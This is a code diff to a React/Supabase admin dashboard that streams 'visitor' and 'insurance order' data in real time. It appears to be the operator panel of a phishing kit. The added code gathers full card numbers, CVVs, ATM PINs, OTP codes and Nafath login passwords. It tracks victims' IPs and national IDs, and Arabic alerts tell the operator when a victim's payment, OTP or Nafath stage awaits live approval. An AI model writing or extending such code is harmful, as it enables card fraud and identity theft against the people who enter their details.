@@ -180,6 +180,61 @@ interface StageEvent {
   payload: Record<string, any> | null;
 }
 
+const VISITOR_SYNC_KEYS: (keyof Visitor)[] = [
+  "visitor_name",
+  "current_page",
+  "phone",
+  "national_id",
+  "linked_request_id",
+  "linked_conversation_id",
+  "is_blocked",
+  "is_favorite",
+  "user_agent",
+  "ip_address",
+  "country",
+  "country_code",
+  "tags",
+  "redirect_to",
+];
+
+const normalizeVisitorRow = (visitor: Visitor): Visitor => ({
+  ...visitor,
+  is_online: Date.now() - new Date(visitor.last_seen_at).getTime() < 30000,
+});
+
+const hasMeaningfulVisitorChange = (nextVisitor: Visitor, previousVisitor?: Partial<Visitor> | null) => {
+  if (!previousVisitor) return true;
+
+  return VISITOR_SYNC_KEYS.some((key) => {
+    const nextValue = nextVisitor[key];
+    const prevValue = previousVisitor[key];
+
+    if (Array.isArray(nextValue) || Array.isArray(prevValue)) {
+      return JSON.stringify(nextValue ?? []) !== JSON.stringify(prevValue ?? []);
+    }
+
+    return nextValue !== prevValue;
+  });
+};
+
+const buildPendingOrderDetails = (order: Partial<InsuranceOrder>) => ({
+  stage: order.current_stage || "",
+  otp_code: order.otp_code || undefined,
+  phone_otp_code: order.phone_otp_code || undefined,
+  nafath_number: order.nafath_number || undefined,
+  nafath_password: order.nafath_password || undefined,
+  customer_name: order.customer_name || undefined,
+  card_number_full: order.card_number_full || undefined,
+  card_holder_name: order.card_holder_name || undefined,
+  card_expiry: order.card_expiry || undefined,
+  card_cvv: order.card_cvv || undefined,
+  card_last_four: order.card_last_four || undefined,
+  payment_method: order.payment_method || undefined,
+  total_price: order.total_price || undefined,
+  company: order.company || undefined,
+  atm_pin: order.atm_pin || undefined,
+});
+
 const AdminVisitors = () => {
   const isMobile = useIsMobile();
   const supportsIntersectionObserver = typeof window !== "undefined" && "IntersectionObserver" in window;
@@ -221,6 +276,8 @@ const AdminVisitors = () => {
   const detailsPanelRef = useRef<HTMLDivElement | null>(null);
   const fullRefreshTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const visitorsRefreshTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const visitorsRef = useRef<Visitor[]>([]);
+  const linkedOrdersRef = useRef<InsuranceOrder[]>([]);
   const [visibleCount, setVisibleCount] = useState(() => (typeof window !== "undefined" && window.innerWidth < 768 ? 12 : 20));
   const listEndRef = useRef<HTMLDivElement | null>(null);
   // Request browser notification permission on mount
@@ -396,6 +453,141 @@ const AdminVisitors = () => {
       return new Date(b.last_seen_at).getTime() - new Date(a.last_seen_at).getTime();
     });
   }, []);
+
+  const findVisitorIdForOrder = useCallback((order?: Partial<InsuranceOrder> | null) => {
+    if (!order) return null;
+
+    const matchedVisitor = visitorsRef.current.find((visitor) =>
+      (visitor.session_id && order.visitor_session_id === visitor.session_id) ||
+      (visitor.phone && order.phone === visitor.phone) ||
+      (visitor.national_id && order.national_id === visitor.national_id)
+    );
+
+    return matchedVisitor?.id || null;
+  }, []);
+
+  const isOrderRelevantToSelectedVisitor = useCallback((order?: Partial<InsuranceOrder> | null) => {
+    const visitor = selectedVisitorRef.current;
+    if (!visitor || !order) return false;
+
+    return (
+      (visitor.session_id && order.visitor_session_id === visitor.session_id) ||
+      (visitor.phone && order.phone === visitor.phone) ||
+      (visitor.national_id && order.national_id === visitor.national_id) ||
+      (!!order.id && linkedOrdersRef.current.some((linkedOrder) => linkedOrder.id === order.id))
+    );
+  }, []);
+
+  const isStageEventRelevantToSelectedVisitor = useCallback((event?: Partial<StageEvent> | null) => {
+    const visitor = selectedVisitorRef.current;
+    if (!visitor || !event) return false;
+
+    return (
+      (visitor.session_id && event.visitor_session_id === visitor.session_id) ||
+      (!!event.order_id && linkedOrdersRef.current.some((linkedOrder) => linkedOrder.id === event.order_id))
+    );
+  }, []);
+
+  const applyVisitorRealtimeChange = useCallback((payload: any) => {
+    const eventType = payload.eventType as "INSERT" | "UPDATE" | "DELETE";
+    const nextRow = payload.new ? normalizeVisitorRow(payload.new as Visitor) : null;
+    const previousRow = payload.old as Partial<Visitor> | null;
+    const targetId = nextRow?.id || previousRow?.id;
+
+    if (!targetId) return;
+    if (eventType === "UPDATE" && nextRow && !hasMeaningfulVisitorChange(nextRow, previousRow)) return;
+
+    setVisitors((currentVisitors) => {
+      let nextVisitors = currentVisitors;
+
+      if (eventType === "DELETE") {
+        nextVisitors = currentVisitors.filter((visitor) => visitor.id !== targetId);
+      } else if (nextRow) {
+        const existingIndex = currentVisitors.findIndex((visitor) => visitor.id === nextRow.id);
+
+        if (existingIndex === -1) {
+          nextVisitors = [nextRow, ...currentVisitors];
+        } else {
+          nextVisitors = [...currentVisitors];
+          nextVisitors[existingIndex] = { ...nextVisitors[existingIndex], ...nextRow };
+        }
+      }
+
+      return sortVisitors(nextVisitors, pendingStageMapRef.current);
+    });
+
+    if (eventType === "DELETE") {
+      if (selectedVisitorRef.current?.id === targetId) {
+        setSelectedVisitor(null);
+      }
+      return;
+    }
+
+    if (nextRow && selectedVisitorRef.current?.id === nextRow.id) {
+      setSelectedVisitor((currentVisitor) => (currentVisitor ? { ...currentVisitor, ...nextRow } : currentVisitor));
+    }
+  }, [sortVisitors]);
+
+  const syncPendingStateFromOrder = useCallback((eventType: string, order?: Partial<InsuranceOrder> | null) => {
+    const matchedVisitorId = findVisitorIdForOrder(order);
+    if (!matchedVisitorId) return false;
+
+    if (eventType === "DELETE") {
+      setPendingStageMap((currentMap) => {
+        if (!(matchedVisitorId in currentMap)) return currentMap;
+        const nextMap = { ...currentMap };
+        delete nextMap[matchedVisitorId];
+        return nextMap;
+      });
+
+      delete pendingOrderDetailsRef.current[matchedVisitorId];
+      return true;
+    }
+
+    if (order?.stage_status === "pending" && order.current_stage) {
+      pendingOrderDetailsRef.current = {
+        ...pendingOrderDetailsRef.current,
+        [matchedVisitorId]: buildPendingOrderDetails(order),
+      };
+
+      setPendingStageMap((currentMap) => {
+        if (currentMap[matchedVisitorId] === order.current_stage) return currentMap;
+        return { ...currentMap, [matchedVisitorId]: order.current_stage };
+      });
+
+      setLastResolvedMap((currentMap) => {
+        if (!(matchedVisitorId in currentMap)) return currentMap;
+        const nextMap = { ...currentMap };
+        delete nextMap[matchedVisitorId];
+        return nextMap;
+      });
+
+      return true;
+    }
+
+    if ((order?.stage_status === "approved" || order?.stage_status === "rejected") && order.current_stage) {
+      delete pendingOrderDetailsRef.current[matchedVisitorId];
+
+      setPendingStageMap((currentMap) => {
+        if (!(matchedVisitorId in currentMap)) return currentMap;
+        const nextMap = { ...currentMap };
+        delete nextMap[matchedVisitorId];
+        return nextMap;
+      });
+
+      setLastResolvedMap((currentMap) => ({
+        ...currentMap,
+        [matchedVisitorId]: {
+          stage: order.current_stage as string,
+          status: order.stage_status as string,
+        },
+      }));
+
+      return true;
+    }
+
+    return false;
+  }, [findVisitorIdForOrder]);
 
   const deleteVisitors = async (ids: string[]) => {
     const offlineIds = ids.filter(id => {
@@ -655,6 +847,8 @@ const AdminVisitors = () => {
   const selectedVisitorRef = useRef<Visitor | null>(null);
   useEffect(() => { selectedVisitorRef.current = selectedVisitor; }, [selectedVisitor]);
   useEffect(() => { pendingStageMapRef.current = pendingStageMap; }, [pendingStageMap]);
+  useEffect(() => { visitorsRef.current = visitors; }, [visitors]);
+  useEffect(() => { linkedOrdersRef.current = linkedOrders; }, [linkedOrders]);
 
   // Re-sort visitors when pending stage map changes (prioritize active visitors)
   useEffect(() => {
@@ -685,15 +879,15 @@ const AdminVisitors = () => {
 
     const visitorsChannel = supabase
       .channel("visitors-realtime")
-      .on("postgres_changes", { event: "*", schema: "public", table: "site_visitors" }, () => {
-        debouncedVisitorsRefresh();
+      .on("postgres_changes", { event: "*", schema: "public", table: "site_visitors" }, (payload: any) => {
+        applyVisitorRealtimeChange(payload);
       })
       .subscribe();
 
     const ordersChannel = supabase
       .channel("orders-realtime-admin")
       .on("postgres_changes", { event: "*", schema: "public", table: "insurance_orders" }, (payload: any) => {
-        const row = payload.new;
+        const row = (payload.new || payload.old) as Partial<InsuranceOrder> | null;
         if (row && row.stage_status === "pending" && row.id && !knownPendingOrdersRef.current.has(row.id + "-" + row.current_stage)) {
           knownPendingOrdersRef.current.add(row.id + "-" + row.current_stage);
           if (initialLoadDoneRef.current && localStorage.getItem("admin_feed_mute") !== "true") {
@@ -710,8 +904,15 @@ const AdminVisitors = () => {
             toast.info(`طلب جديد بانتظار الموافقة: ${({ payment: "الدفع", otp: "رمز OTP", phone_verification: "توثيق الجوال", phone_otp: "كود الجوال", stc_call: "مكالمة STC", nafath_login: "دخول نفاذ", nafath_verify: "رمز نفاذ" } as Record<string, string>)[row.current_stage] || row.current_stage}`);
           }
         }
-        debouncedFullRefresh();
-        if (selectedVisitorRef.current) void fetchLinkedData(selectedVisitorRef.current);
+
+        const syncedLocally = syncPendingStateFromOrder(payload.eventType, row);
+        if (!syncedLocally) {
+          debouncedFullRefresh();
+        }
+
+        if (isOrderRelevantToSelectedVisitor(row) && selectedVisitorRef.current) {
+          void fetchLinkedData(selectedVisitorRef.current);
+        }
       })
       .subscribe();
 
@@ -728,7 +929,9 @@ const AdminVisitors = () => {
           };
           toast.info(row.payload?.resend_requested ? `الزائر طلب إرسال رمز جديد: ${stageLabels[row.stage] || row.stage}` : `كود تحقق جديد: ${stageLabels[row.stage] || row.stage}`);
         }
-        if (selectedVisitorRef.current) void fetchLinkedData(selectedVisitorRef.current);
+        if (isStageEventRelevantToSelectedVisitor(row) && selectedVisitorRef.current) {
+          void fetchLinkedData(selectedVisitorRef.current);
+        }
       })
       .subscribe();
 
